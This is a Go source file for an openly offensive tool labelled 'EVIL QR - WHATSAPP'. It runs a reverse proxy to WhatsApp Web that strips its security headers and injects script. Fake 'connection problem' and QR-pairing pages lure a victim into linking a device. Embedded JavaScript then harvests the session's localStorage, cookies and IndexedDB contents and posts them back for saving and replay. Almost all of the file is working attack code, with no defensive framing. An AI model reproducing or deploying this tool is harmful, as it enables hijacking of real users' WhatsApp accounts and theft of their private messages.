package whatsapp

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"programa/utils"
)

const (
	sessionsDir  = "scripts/qr_jacker/whatsapp/sessions"
	sessionsFile = "scripts/qr_jacker/whatsapp/sessions.json"
)

type sessionMeta struct {
	ID        string `json:"id"`
	Timestamp string `json:"timestamp"`
	Browser   string `json:"browser"`
	Profile   string `json:"profile"`
	URL       string `json:"url"`
}

type attackCfg struct {
	Port int
	Host string
}

var (
	capturedSessionJSON string
	capturedMu          sync.Mutex
)

func Run() {
	reader := bufio.NewReader(os.Stdin)
	for {
		utils.ClearTerminal()
		fmt.Printf("\n%s============ EVIL QR - WHATSAPP ============%s\n\n", utils.Blue, utils.Reset)
		fmt.Printf("%s[1] - Start Attack%s\n", utils.Green, utils.Reset)
		fmt.Printf("%s[2] - List Sessions%s\n", utils.Green, utils.Reset)
		fmt.Printf("%s[3] - Replay Session%s\n", utils.Green, utils.Reset)
		utils.PrintReturnOption("4")

		fmt.Printf("\n%sOption: %s", utils.Green, utils.Reset)
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)

		switch input {
		case "1":
			doAttack(reader)
		case "2":
			listSessions()
			utils.WaitForEnter(reader)
		case "3":
			doReplay(reader)
		case "4":
			return
		default:
			fmt.Printf("%sInvalid option!%s\n", utils.Yellow, utils.Reset)
			utils.WaitForEnter(reader)
		}
	}
}

func doAttack(reader *bufio.Reader) {
	utils.ClearTerminal()
	fmt.Printf("\n%s============ CONFIGURE ATTACK ============%s\n", utils.Blue, utils.Reset)

	cfg := attackCfg{
		Port: 8080,
		Host: "0.0.0.0",
	}

	fmt.Printf("%sUse defaults (port 8080, host 0.0.0.0)? [Y/n]: %s", utils.Green, utils.Reset)
	useDef, _ := reader.ReadString('\n')
	useDef = strings.TrimSpace(strings.ToLower(useDef))
	if useDef == "n" || useDef == "no" {
		fmt.Printf("%sPort [8080]: %s", utils.Green, utils.Reset)
		p, _ := reader.ReadString('\n')
		p = strings.TrimSpace(p)
		if p != "" {
			fmt.Sscanf(p, "%d", &cfg.Port)
		}
		fmt.Printf("%sHost [0.0.0.0]: %s", utils.Green, utils.Reset)
		h, _ := reader.ReadString('\n')
		h = strings.TrimSpace(h)
		if h != "" {
			cfg.Host = h
		}
	}

	launchAttack(cfg)
}

func launchAttack(cfg attackCfg) {
	os.MkdirAll(sessionsDir, 0755)

	capturedMu.Lock()
	capturedSessionJSON = ""
	capturedMu.Unlock()

	mux := http.NewServeMux()
	mux.HandleFunc("/", verifyHandler)
	mux.HandleFunc("/qr", phishingHandler)
	mux.HandleFunc("/wa/", proxyHandler)
	mux.HandleFunc("/capture", captureHandler)

	addr := fmt.Sprintf("%s:%d", cfg.Host, cfg.Port)
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		listener, err = net.Listen("tcp", ":0")
		if err != nil {
			fmt.Printf("%s[!] Failed to start HTTP server: %v%s\n", utils.Red, err, utils.Reset)
			utils.PauseForInput()
			return
		}
	}
	actualAddr := listener.Addr().String()

	cfg.Host, cfg.Port = parseAddr(actualAddr)
	ip := utils.GetLocalIP()
	attackURL := fmt.Sprintf("http://%s:%d", ip, cfg.Port)
	localURL := fmt.Sprintf("http://127.0.0.1:%d", cfg.Port)

	fmt.Printf("\n%s[+] Proxy + Phishing server running%s\n", utils.Green, utils.Reset)
	fmt.Printf("%s[+] Send this link to victim: %s%s\n", utils.Yellow, attackURL, utils.Reset)
	fmt.Printf("%s[+] Open locally to test:  %s%s\n", utils.Yellow, localURL, utils.Reset)
	fmt.Printf("%s[+] Victim opens link → sees problem screen → clicks Verify → sees QR → pairs → overlay%s\n", utils.Yellow, utils.Reset)
	fmt.Printf("%s[+] Waiting for victim to scan QR and pair...\n\n%s", utils.Yellow, utils.Reset)

	srv := &http.Server{Handler: mux}
	go srv.Serve(listener)

	start := time.Now()
	timeout := 10 * time.Minute
	sessionCaptured := false

	for time.Since(start) < timeout {
		capturedMu.Lock()
		jsonData := capturedSessionJSON
		capturedMu.Unlock()
		if jsonData != "" {
			sessionCaptured = true

			var data map[string]interface{}
			json.Unmarshal([]byte(jsonData), &data)
			fmt.Printf("\n%s[+] SESSION CAPTURED!%s\n", utils.Green, utils.Reset)
			fmt.Printf("%s[+] localStorage keys: %d%s\n", utils.Green, len(data["localStorage"].(map[string]interface{})), utils.Reset)
			fmt.Printf("%s[+] IndexedDB databases: %v%s\n", utils.Green, data["indexedDB"], utils.Reset)

			saveCapturedSession(jsonData)
			break
		}
		time.Sleep(time.Second)
	}

	srv.Close()

	if !sessionCaptured {
		fmt.Printf("\n%s[!] No session captured within timeout.%s\n", utils.Yellow, utils.Reset)
	}
	utils.PauseForInput()
}

func verifyHandler(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
	w.Write([]byte(verifyPageHTML))
}

func phishingHandler(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/qr" {
		http.NotFound(w, r)
		return
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
	w.Write([]byte(phishingPageHTML))
}

func proxyHandler(w http.ResponseWriter, r *http.Request) {
	targetURL, _ := url.Parse("https://web.whatsapp.com")
	proxy := httputil.NewSingleHostReverseProxy(targetURL)

	proxy.ModifyResponse = func(resp *http.Response) error {
		resp.Header.Del("X-Frame-Options")
		resp.Header.Del("Content-Security-Policy")
		resp.Header.Del("X-Content-Type-Options")
		resp.Header.Del("Strict-Transport-Security")
		resp.Header.Del("Cross-Origin-Resource-Policy")
		resp.Header.Del("Cross-Origin-Embedder-Policy")
		resp.Header.Del("Cross-Origin-Opener-Policy")

		ct := resp.Header.Get("Content-Type")
		if strings.Contains(ct, "text/html") {
			body, err := io.ReadAll(resp.Body)
			if err != nil {
				return err
			}
			resp.Body.Close()

			sbody := string(body)
			sbodyLower := strings.ToLower(sbody)

			injection := `<base href="/wa/"><script>window.top=window;window.parent=window;if(navigator.serviceWorker){var r=navigator.serviceWorker.register;navigator.serviceWorker.register=function(){return Promise.resolve({active:null,installing:null,waiting:null,update:function(){return Promise.resolve()},unregister:function(){return Promise.resolve(!0)}})}}</script>`

			idx := strings.Index(sbodyLower, "<head")
			if idx >= 0 {
				end := strings.Index(sbodyLower[idx:], ">")
				if end >= 0 {
					sbody = sbody[:idx+end+1] + injection + sbody[idx+end+1:]
				}
			}
			body = []byte(sbody)

			resp.Body = io.NopCloser(strings.NewReader(string(body)))
			resp.ContentLength = int64(len(body))
			resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(body)))
		}
		return nil
	}

	r.URL.Path = strings.TrimPrefix(r.URL.Path, "/wa")
	if !strings.HasPrefix(r.URL.Path, "/") {
		r.URL.Path = "/" + r.URL.Path
	}
	r.RequestURI = r.URL.String()

	proxy.ServeHTTP(w, r)
}

func captureHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	body, _ := io.ReadAll(r.Body)
	capturedMu.Lock()
	capturedSessionJSON = string(body)
	capturedMu.Unlock()
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("captured"))
}

const verifyPageHTML = `<!DOCTYPE html>
<html lang="en"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WhatsApp Web</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh;color:#41525d}
.card{background:#fff;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,0.08);max-width:440px;width:90%;padding:48px 40px;text-align:center}
.icon{width:64px;height:64px;background:#fef3e2;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px}
.icon svg{width:32px;height:32px}
h1{font-size:22px;font-weight:500;color:#1f2a30;margin-bottom:10px}
p{font-size:15px;line-height:1.6;color:#667781;margin-bottom:24px}
.btn{display:inline-block;background:#00a884;color:#fff;border:none;border-radius:24px;padding:12px 36px;font-size:15px;font-weight:500;cursor:pointer;text-decoration:none;transition:background .15s}
.btn:hover{background:#009972}
.btn:disabled{opacity:.5;cursor:default}
.spinner{display:inline-block;width:18px;height:18px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .6s linear infinite;vertical-align:middle;margin-right:6px}
@keyframes spin{to{transform:rotate(360deg)}}
</style></head><body>
<div class="card">
<div class="icon"><svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#e67e22" stroke-width="1.5"/><line x1="12" y1="8" x2="12" y2="13" stroke="#e67e22" stroke-width="1.5" stroke-linecap="round"/><circle cx="12" cy="16" r="0.75" fill="#e67e22"/></svg></div>
<h1>Connection problem detected</h1>
<p>We detected a temporary connection issue with your WhatsApp session. For security reasons, you need to verify your identity before continuing to WhatsApp Web.</p>
<button class="btn" id="verifyBtn" onclick="this.disabled=true;this.innerHTML='<span class=spinner></span>Verifying...';setTimeout(function(){window.location.href='/qr'},1200)">Verify identity</button>
</div>
</body></html>`

const phishingPageHTML = `<!DOCTYPE html>
<html lang="en"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>WhatsApp Web</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;flex-direction:column;overflow:hidden;color:#41525d}
.top-bar{background:#00a884;height:6px;flex-shrink:0}
.main{flex:1;display:flex;align-items:center;justify-content:center;padding:24px}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,0.06);display:flex;flex-direction:row;max-width:1000px;width:100%;min-height:520px;overflow:hidden}
.left{flex:1.1;padding:56px 48px;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center}
.left .logo{margin-bottom:16px}
.left .logo svg{width:48px;height:48px}
.left h1{font-size:28px;font-weight:275;color:#41525d;margin-bottom:10px;letter-spacing:-0.3px}
.left .sub{font-size:15px;color:#667781;line-height:1.5;max-width:300px;margin-bottom:28px}
.left .steps-wrap{background:#f9fafb;border-radius:12px;padding:20px 24px;text-align:left;width:100%;max-width:320px}
.left .steps-wrap .step{display:flex;align-items:flex-start;gap:12px;margin-bottom:14px;font-size:14px;color:#3b4a54;line-height:1.5}
.left .steps-wrap .step:last-child{margin-bottom:0}
.left .steps-wrap .num{background:#00a884;color:#fff;border-radius:50%;width:22px;height:22px;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:600;flex-shrink:0;margin-top:1px}
.left .steps-wrap .step strong{color:#1f2a30}
.right{flex:1;background:#fcfdfd;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:48px 40px;border-left:1px solid #e9edef;position:relative}
.right .qr-label{font-size:13px;color:#8696a0;margin-bottom:14px;text-transform:uppercase;letter-spacing:1px}
.right .qr-border{border:3px solid #00a884;border-radius:16px;padding:12px;background:#fff;box-shadow:0 1px 6px rgba(0,168,132,0.12);margin-bottom:18px}
.right .qr-border iframe{display:block;width:240px;height:240px;border:none;border-radius:4px}
.right .actions{display:flex;gap:10px;margin-top:4px}
.right .actions a{display:inline-block;padding:8px 22px;border-radius:24px;font-size:13px;text-decoration:none;cursor:pointer;transition:all .15s}
.right .actions .refresh{background:#00a884;color:#fff;border:none;font-weight:500}
.right .actions .refresh:hover{background:#009972}
.right .actions .link{background:transparent;color:#00a884;border:1px solid #d9dee0}
.right .actions .link:hover{background:#f0faf8}
.footer{text-align:center;padding:18px;font-size:12px;color:#8696a0;background:#f0f2f5;flex-shrink:0;border-top:1px solid #e9edef}
.footer a{color:#00a884;text-decoration:none;margin:0 10px}
.footer a:hover{text-decoration:underline}
#verify-overlay{position:fixed;top:0;left:0;width:100%;height:100%;z-index:999;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,0.85);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
#verify-overlay.active{display:flex}
#verify-overlay .msg{background:#fff;border-radius:12px;padding:40px;max-width:420px;text-align:center;color:#41525d}
#verify-overlay .msg h2{font-size:22px;font-weight:500;margin-bottom:12px;color:#1f2a30}
#verify-overlay .msg p{font-size:15px;line-height:1.5;color:#667781;margin-bottom:20px}
#verify-overlay .msg .btn{display:inline-block;background:#00a884;color:#fff;border:none;border-radius:24px;padding:10px 32px;font-size:15px;cursor:pointer}
#verify-overlay .msg .btn:hover{background:#009972}
@media(max-width:800px){.card{flex-direction:column-reverse;min-height:auto;border-radius:0}.left,.right{padding:28px 20px;border-left:none}.left .steps-wrap{max-width:100%}.right .qr-border iframe{width:200px;height:200px}}
@media(max-width:480px){.main{padding:0}.card{box-shadow:none}.left h1{font-size:22px}}
</style></head><body>
<div class="top-bar"></div>
<div class="main"><div class="card"><div class="left"><div class="logo"><svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg"><path fill="#00a884" d="M24 0C10.8 0 0 10.8 0 24c0 4.8 1.4 9.2 3.8 13L1.2 46.8 12 43.2c3.6 2 7.8 3.2 12 3.2 13.2 0 24-10.8 24-24S37.2 0 24 0z"/><path fill="#fff" d="M33.6 28.8c-.6-.3-3.6-1.8-4.2-2-.6-.2-1-.3-1.4.3-.4.6-1.6 2-2 2.4-.4.4-.8.4-1.4.1-.6-.3-2.4-.9-4.6-2.8-1.7-1.5-2.8-3.3-3.2-3.9-.3-.6 0-.9.3-1.2.3-.3.6-.6.8-.9.3-.3.4-.6.6-.9.2-.3.1-.6-.1-.9-.2-.3-1.4-3.4-1.9-4.6-.5-1.2-1-1-1.4-1-.4 0-.8-.1-1.2-.1-.4 0-1.1.2-1.7.8-.6.6-2.2 2.2-2.2 5.3s2.2 6.2 2.6 6.6c.3.4 4.4 7 10.8 9.6 1.5.6 2.7 1 3.6 1.3 1.5.5 2.9.4 4 .3 1.2-.1 3.8-1.5 4.3-3 .5-1.4.5-2.6.4-2.9-.2-.3-.6-.5-1.1-.8z"/></svg></div><h1>Use WhatsApp on your computer</h1><p class="sub">To use WhatsApp on your computer, scan this QR code with your phone.</p><div class="steps-wrap"><div class="step"><span class="num">1</span><span>Open <strong>WhatsApp</strong> on your phone</span></div><div class="step"><span class="num">2</span><span>Tap <strong>Menu</strong> or <strong>Settings</strong> and select <strong>Linked Devices</strong></span></div><div class="step"><span class="num">3</span><span>Point your phone at this screen to scan the QR code</span></div></div></div><div class="right"><div class="qr-label">Scan QR Code</div><div class="qr-border"><iframe id="wa-frame" src="/wa/" width="240" height="240"></iframe></div><div class="actions"><a class="refresh" href="#" onclick="document.getElementById('wa-frame').src='/wa/?t='+Date.now()">Refresh QR</a></div></div></div></div>
<div class="footer"><a href="#">Get WhatsApp for Windows</a><a href="#">Tutorial</a><a href="#">Privacy Policy</a></div>
<div id="verify-overlay"><div class="msg"><h2>Verification required</h2><p>For security reasons, please confirm your identity to continue using WhatsApp Web. Click the button below to verify.</p><button class="btn" onclick="document.getElementById('verify-overlay').classList.remove('active')">Verify</button></div></div>
<script>
(function(){
var frame = document.getElementById('wa-frame');
var overlay = document.getElementById('verify-overlay');
var captured = false;

function checkCapture(){
if(captured) return;
try{
var doc = frame.contentDocument || frame.contentWindow.document;
if(!doc) return;
var headers = doc.querySelectorAll('header');
if(headers.length > 0 && !captured){
captured = true;
var data = {localStorage:{},cookies:'',indexedDB:[]};
try{
var ls = frame.contentWindow.localStorage;
for(var i=0;i<ls.length;i++){var k=ls.key(i);data.localStorage[k]=ls.getItem(k);}
}catch(e){}
try{data.cookies=frame.contentDocument.cookie||'';}catch(e){}
try{
if(frame.contentWindow.indexedDB && frame.contentWindow.indexedDB.databases){
frame.contentWindow.indexedDB.databases().then(function(dbs){
data.indexedDB=dbs.map(function(d){return{name:d.name,version:d.version};});
readDBData(frame,data);
}).catch(function(e){sendCapture(data);});
}else{sendCapture(data);}
}catch(e){sendCapture(data);}
overlay.classList.add('active');
}
}catch(e){}
}

function readDBData(frame,data){
if(!frame.contentWindow.indexedDB) return sendCapture(data);
var dbs=data.indexedDB;
if(!dbs||dbs.length===0) return sendCapture(data);
var pending=dbs.length;
data.dbContents={};
dbs.forEach(function(dbInfo){
try{
var req=frame.contentWindow.indexedDB.open(dbInfo.name,dbInfo.version||undefined);
req.onsuccess=function(){
var db=req.result;
data.dbContents[dbInfo.name]={};
var storeNames=Array.from(db.objectStoreNames);
if(storeNames.length===0){pending--;db.close();if(pending<=0)sendCapture(data);return;}
var sp=storeNames.length;
storeNames.forEach(function(sn){
var tx=db.transaction(sn,'readonly');
var store=tx.objectStore(sn);
var getAll=store.getAll();
getAll.onsuccess=function(){data.dbContents[dbInfo.name][sn]=getAll.result;sp--;if(sp<=0){pending--;db.close();if(pending<=0)sendCapture(data);}};
getAll.onerror=function(){sp--;if(sp<=0){pending--;db.close();if(pending<=0)sendCapture(data);}};
});
};
req.onerror=function(){pending--;if(pending<=0)sendCapture(data);};
}catch(e){pending--;if(pending<=0)sendCapture(data);}
});
}

function sendCapture(data){
try{fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).catch(function(){});}catch(e){}
}

setInterval(checkCapture,2000);
})();
</script>
</body></html>`

func saveCapturedSession(jsonData string) {
	os.MkdirAll(sessionsDir, 0755)

	ts := time.Now().Format("2006-01-02_15-04-05")
	sessionDir := filepath.Join(sessionsDir, ts)
	os.MkdirAll(sessionDir, 0755)

	sessionFile := filepath.Join(sessionDir, "session.json")
	os.WriteFile(sessionFile, []byte(jsonData), 0644)

	sessions := loadSessions()
	id := fmt.Sprintf("%d", len(sessions))
	sessions[id] = sessionMeta{
		ID:        id,
		Timestamp: ts,
		Browser:   "proxy",
		Profile:   sessionDir,
		URL:       "-",
	}
	saveSessions(sessions)
	fmt.Printf("%s[+] Session saved! ID: %s | Path: %s%s\n", utils.Green, id, sessionDir, utils.Reset)
}

func loadSessions() map[string]sessionMeta {
	data, err := os.ReadFile(sessionsFile)
	if err != nil {
		return make(map[string]sessionMeta)
	}
	var sessions map[string]sessionMeta
	if json.Unmarshal(data, &sessions) != nil {
		return make(map[string]sessionMeta)
	}
	return sessions
}

func saveSessions(sessions map[string]sessionMeta) {
	data, _ := json.MarshalIndent(sessions, "", "  ")
	os.WriteFile(sessionsFile, data, 0644)
}

func listSessions() {
	sessions := loadSessions()
	if len(sessions) == 0 {
		fmt.Printf("\n%sNo saved sessions.%s\n", utils.Yellow, utils.Reset)
		return
	}
	fmt.Printf("\n%sSaved Sessions:%s\n", utils.Blue, utils.Reset)
	for id, s := range sessions {
		fmt.Printf("  %s%s%s - %s (%s)\n", utils.Green, id, utils.Reset, s.Timestamp, s.Browser)
	}
}

func doReplay(reader *bufio.Reader) {
	sessions := loadSessions()
	if len(sessions) == 0 {
		fmt.Printf("\n%sNo saved sessions.%s\n", utils.Yellow, utils.Reset)
		utils.WaitForEnter(reader)
		return
	}

	listSessions()
	fmt.Printf("\n%sSession ID to replay: %s", utils.Green, utils.Reset)
	id, _ := reader.ReadString('\n')
	id = strings.TrimSpace(id)

	s, ok := sessions[id]
	if !ok {
		fmt.Printf("%s[!] Invalid session ID%s\n", utils.Red, utils.Reset)
		utils.WaitForEnter(reader)
		return
	}

	sessionFile := filepath.Join(s.Profile, "session.json")
	data, err := os.ReadFile(sessionFile)
	if err != nil {
		fmt.Printf("%s[!] Failed to read session file: %v%s\n", utils.Red, err, utils.Reset)
		utils.WaitForEnter(reader)
		return
	}

	fmt.Printf("%s[+] Session data loaded (%d bytes)%s\n", utils.Green, len(data), utils.Reset)
	fmt.Printf("%s[+] Session data:%s\n%s\n", utils.Yellow, utils.Reset, string(data))

	browser := detectBrowser()
	if browser == "" {
		fmt.Printf("%s[!] No browser found%s\n", utils.Red, utils.Reset)
		utils.WaitForEnter(reader)
		return
	}

	exec.Command(browser, "--new-window", "https://web.whatsapp.com").Start()

	utils.WaitForEnter(reader)
}

func detectBrowser() string {
	env := os.Getenv("BROWSER")
	if env != "" {
		parts := strings.Fields(env)
		if len(parts) > 0 {
			if path, err := exec.LookPath(parts[0]); err == nil {
				return path
			}
		}
	}

	knownPaths := []string{
		"/usr/bin/zen-browser",
		"/opt/zen/firefox",
		"/usr/bin/firefox",
		"/snap/bin/firefox",
		"/usr/bin/chromium",
		"/usr/bin/google-chrome",
	}
	for _, p := range knownPaths {
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}

	candidates := []string{
		"zen-browser", "zen",
		"firefox", "mozilla-firefox",
		"chromium", "chromium-browser",
		"google-chrome", "google-chrome-stable",
		"chrome", "chrome-browser",
	}
	for _, name := range candidates {
		path, err := exec.LookPath(name)
		if err == nil {
			return path
		}
	}
	return ""
}

func parseAddr(addr string) (string, int) {
	host, portStr, err := net.SplitHostPort(addr)
	if err != nil {
		return "0.0.0.0", 8080
	}
	port := 8080
	fmt.Sscanf(portStr, "%d", &port)
	return host, port
}
